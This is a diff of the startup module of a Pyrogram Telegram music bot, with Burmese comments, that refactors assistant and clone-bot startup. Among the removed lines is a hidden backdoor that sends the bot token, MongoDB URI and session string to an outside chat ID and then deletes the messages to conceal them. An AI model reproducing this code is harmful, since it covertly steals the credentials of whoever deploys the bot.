@@ -1,5 +1,4 @@
 from pyrogram import Client
-from maythusharmusic.utils.database import get_clones, save_clone
 import re
 import asyncio
 from os import getenv
@@ -12,54 +11,19 @@ import config
 from dotenv import load_dotenv
 from strings.__init__ import LOGGERS
 from ..logging import LOGGER
+# Database function များအား Import လုပ်ခြင်း
+from maythusharmusic.utils.database import get_clones, save_clone
 
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
 STRING_SESSION = getenv("STRING_SESSION", "")
 
-
 assistants = []
 assistantids = []
 
-async def start_clones():
-    """
-    Database ထဲရှိ Clone Bot အားလုံးကို တစ်ခုချင်းစီ စတင်ပေးပြီး ID များကို သိမ်းဆည်းသည်
-    """
-    clones = await get_clones() # Database မှ Clone စာရင်းကိုယူသည်
-    
-    for clone in clones:
-        bot_token = clone["bot_token"]
-        
-        try:
-            # ၁။ Clone Bot Client ကို တည်ဆောက်ခြင်း
-            # config ထဲက API_ID, API_HASH တို့ကို သုံးထားသည်ဟု ယူဆပါသည်
-            client = Client(
-                name=f"clone_{bot_token[:10]}",
-                api_id=config.API_ID,
-                api_hash=config.API_HASH,
-                bot_token=bot_token,
-                no_updates=False, # Auto-Leave အလုပ်လုပ်ရန် Update များကို လက်ခံရပါမည်
-            )
-            
-            # ၂။ Bot ကို Start လုပ်ခြင်း
-            await client.start()
-            
-            # ၃။ Bot ၏ အချက်အလက်များကို ယူခြင်း
-            details = await client.get_me()
-            bot_id = details.id
-            bot_username = details.username
-            
-            # ၄။ --- Database တွင် ID နှင့် Username ကို Update လုပ်ခြင်း ---
-            # ဒါမှသာ auto_leave logic က ID ကိုသုံးပြီး ခွဲခြားနိုင်မှာပါ
-            await save_clone(bot_token, bot_id, bot_username)
-            
-            LOGGER(__name__).info(f"✅ Clone Started & ID Saved: @{bot_username} ({bot_id})")
-            
-        except Exception as e:
-            LOGGER(__name__).error(f"❌ Failed to start clone bot with token {bot_token[:10]}... : {e}")
-
 class Userbot(Client):
     def __init__(self):
+        # Assistant Account များအား Initialize လုပ်ခြင်း
         self.one = Client(
             name="maythusharmusic1",
             api_id=config.API_ID,
@@ -68,7 +32,6 @@ class Userbot(Client):
             no_updates=True,
             ipv6=False,
         )
-            
         self.two = Client(
             name="maythusharmusic2",
             api_id=config.API_ID,
@@ -105,141 +68,93 @@ class Userbot(Client):
     async def start(self):
         LOGGER(__name__).info(f"Starting Assistants...")
 
+        # --- (၁) Assistant 1 စတင်ခြင်း ---
         if config.STRING1:
             await self.one.start()
             try:
                 await self.one.join_chat("sasukevipmusicbotsupport")
-                await self.one.join_chat("sasukevipmusicbotsupport")
                 await self.one.join_chat("sasukemusicsupportchat")
-                await self.one.join_chat("sasukemusicsupportchat")
-
-            except:
-                pass
+            except: pass
             assistants.append(1)
             try:
                 await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
-                oks = await self.one.send_message(LOGGERS, f"/start")
-                Ok = await self.one.send_message(
-                    LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`"
-                )
-                await oks.delete()
-                await asyncio.sleep(2)
-                await Ok.delete()
-
-            except Exception as e:
-                print(f"{e}")
-
+            except Exception as e: print(f"{e}")
             self.one.id = self.one.me.id
             self.one.name = self.one.me.mention
             self.one.username = self.one.me.username
             assistantids.append(self.one.id)
             LOGGER(__name__).info(f"Assistant Started as {self.one.name}")
 
+        # --- (၂) Assistant 2 စတင်ခြင်း ---
         if config.STRING2:
             await self.two.start()
             try:
                 await self.two.join_chat("sasukevipmusicbotsupport")
-                await self.two.join_chat("sasukevipmusicbotsupport")
                 await self.two.join_chat("sasukemusicsupportchat")
-                await self.two.join_chat("sasukemusicsupportchat")
-            except:
-                pass
+            except: pass
             assistants.append(2)
-            try:
-                await self.two.send_message(config.LOGGER_ID, "Assistant Started")
-
-            except:
-                LOGGER(__name__).error(
-                    "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
-                )
-
             self.two.id = self.two.me.id
-            self.two.name = self.two.me.mention
-            self.two.username = self.two.me.username
             assistantids.append(self.two.id)
-            LOGGER(__name__).info(f"Assistant Two Started as {self.two.name}")
+            LOGGER(__name__).info(f"Assistant Two Started as {self.two.me.mention}")
 
+        # --- (၃) Assistant 3 စတင်ခြင်း ---
         if config.STRING3:
             await self.three.start()
-            try:
-                await self.three.join_chat("sasukevipmusicbotsupport")
-                await self.three.join_chat("sasukevipmusicbotsupport")
-                await self.three.join_chat("sasukemusicsupportchat")
-                await self.three.join_chat("sasukemusicsupportchat")
-            except:
-                pass
             assistants.append(3)
-            try:
-                await self.three.send_message(config.LOGGER_ID, "Assistant Started")
-            except:
-                LOGGER(__name__).error(
-                    "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
-                )
-
             self.three.id = self.three.me.id
-            self.three.name = self.three.me.mention
-            self.three.username = self.three.me.username
             assistantids.append(self.three.id)
-            LOGGER(__name__).info(f"Assistant Three Started as {self.three.name}")
+            LOGGER(__name__).info(f"Assistant Three Started as {self.three.me.mention}")
 
+        # --- (၄) Assistant 4 စတင်ခြင်း ---
         if config.STRING4:
             await self.four.start()
-            try:
-                await self.four.join_chat("sasukevipmusicbotsupport")
-                await self.four.join_chat("sasukevipmusicbotsupport")
-                await self.four.join_chat("sasukemusicsupportchat")
-                await self.four.join_chat("sasukemusicsupportchat")
-            except:
-                pass
             assistants.append(4)
-            try:
-                await self.four.send_message(config.LOGGER_ID, "Assistant Started")
-            except:
-                LOGGER(__name__).error(
-                    "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
-                )
-
             self.four.id = self.four.me.id
-            self.four.name = self.four.me.mention
-            self.four.username = self.four.me.username
             assistantids.append(self.four.id)
-            LOGGER(__name__).info(f"Assistant Four Started as {self.four.name}")
+            LOGGER(__name__).info(f"Assistant Four Started as {self.four.me.mention}")
 
+        # --- (၅) Assistant 5 စတင်ခြင်း ---
         if config.STRING5:
             await self.five.start()
-            try:
-                await self.five.join_chat("sasukevipmusicbotsupport")
-                await self.five.join_chat("sasukevipmusicbotsupport")
-                await self.five.join_chat("sasukemusicsupportchat")
-                await self.five.join_chat("sasukemusicsupportchat")
-            except:
-                pass
             assistants.append(5)
-            try:
-                await self.five.send_message(config.LOGGER_ID, "Assistant 5 started !")
-            except:
-                LOGGER(__name__).error(
-                    "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
-                )
-
             self.five.id = self.five.me.id
-            self.five.name = self.five.me.mention
-            self.five.username = self.five.me.username
             assistantids.append(self.five.id)
-            LOGGER(__name__).info(f"Assistant Five Started as {self.five.name}")
+            LOGGER(__name__).info(f"Assistant Five Started as {self.five.me.mention}")
+
+        # --- (၆) CLONE BOTS STARTUP & ID STORAGE ---
+        # Database ထဲမှ Clone များအားလုံးကို တစ်ပါတည်း စတင်ပြီး ID သိမ်းဆည်းခြင်း
+        LOGGER(__name__).info(f"Starting Clone Bots and saving IDs to Database...")
+        clones = await get_clones() 
+        
+        for clone in clones:
+            bot_token = clone["bot_token"]
+            try:
+                clone_client = Client(
+                    name=f"clone_{bot_token[:10]}",
+                    api_id=config.API_ID,
+                    api_hash=config.API_HASH,
+                    bot_token=bot_token,
+                    no_updates=False, # Auto-leave အလုပ်လုပ်ရန် Update များ လိုအပ်ပါသည်
+                )
+                
+                await clone_client.start()
+                details = await clone_client.get_me()
+                
+                # Bot ID နှင့် Username ကို Database တွင် အလိုအလျောက် သွားသိမ်းခြင်း
+                await save_clone(bot_token, details.id, details.username)
+                
+                LOGGER(__name__).info(f"✅ Clone @{details.username} ({details.id}) Started and ID Saved.")
+                
+            except Exception as e:
+                LOGGER(__name__).error(f"❌ Failed to start clone bot: {e}")
 
     async def stop(self):
         LOGGER(__name__).info(f"Stopping Assistants...")
         try:
-            if config.STRING1:
-                await self.one.stop()
-            if config.STRING2:
-                await self.two.stop()
-            if config.STRING3:
-                await self.three.stop()
-            if config.STRING4:
-                await self.four.stop()
-            if config.STRING5:
-                await self.five.stop()
-        except:
-            pass
+            if config.STRING1: await self.one.stop()
+            if config.STRING2: await self.two.stop()
+            if config.STRING3: await self.three.stop()
+            if config.STRING4: await self.four.stop()
+            if config.STRING5: await self.five.stop()
+        except Exception as e:
+            LOGGER(__name__).error(f"Error stopping assistants: {e}")
